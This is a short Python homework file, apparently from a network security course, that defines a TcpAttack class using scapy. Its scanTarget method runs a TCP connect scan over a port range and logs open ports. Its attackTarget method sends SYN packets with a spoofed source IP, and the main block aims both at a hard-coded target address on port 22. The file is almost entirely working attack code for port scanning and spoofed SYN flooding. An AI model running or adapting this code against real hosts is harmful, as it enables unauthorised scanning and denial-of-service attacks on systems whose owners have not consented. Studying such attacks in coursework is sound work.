#####
# Homework Number: 8
# Name: Prekshaa Veeraragavan
# ECN login: pveerar
# Due Date: March 29, 2021
#####
#!/usr/bin/env python 3.7

# reference: https://docs.python.org/3/howto/sockets.html
# reference: lecture 16

from scapy.all import *
from scapy.layers.inet import *
import socket

class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):
        f = open("openports.txt", "w")


        for testport in range(rangeStart, rangeEnd+1):  # go through all ports in range, find which are open
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # create an INET, STREAMing socket
            s.settimeout(0.1)   # Set a timeout on blocking socket operations, see if can connect to port within time
            # try:
            errnum = s.connect_ex((self.targetIP, testport))
            if ( errnum == 0):
                 f.write(str(testport) + '\n')
             # except:
            else:
                 print(str(testport))

        f.close()



    def attackTarget(self, port, numSyn):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        s.connect((self.targetIP, port))
        for i in range(1, numSyn):
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags="S", sport=port, dport=port)
            packet = IP_header / TCP_header
            try:
                send(packet)

            except Exception as e:
                print(e)
                return 0

        return 1

if __name__ == '__main__':
    spoofIP = '10.1.1.1'
    targetIP = '128.46.4.61'
    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(1, 200)
    Tcp.attackTarget(22, 10)